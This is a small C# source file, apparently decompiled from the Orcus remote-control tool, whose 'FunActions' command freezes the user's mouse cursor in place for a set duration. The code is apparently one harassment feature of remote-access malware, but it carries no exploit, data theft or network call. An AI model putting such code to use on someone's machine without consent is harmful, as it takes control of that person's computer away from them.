using System;
using System.Drawing;
using System.Timers;
using System.Windows.Forms;

namespace Orcus.Commands.FunActions;

internal class Mouse
{
	public static void Hold(TimeSpan duration)
	{
		Point currentCursorPosition = Cursor.get_Position();
		Timer timer = new Timer
		{
			Interval = 5.0
		};
		DateTime currentTime = DateTime.UtcNow;
		timer.Elapsed += delegate
		{
			Cursor.set_Position(currentCursorPosition);
			if ((DateTime.UtcNow - currentTime).TotalMilliseconds > duration.TotalMilliseconds)
			{
				timer.Stop();
				timer.Dispose();
			}
		};
		timer.Start();
	}
}
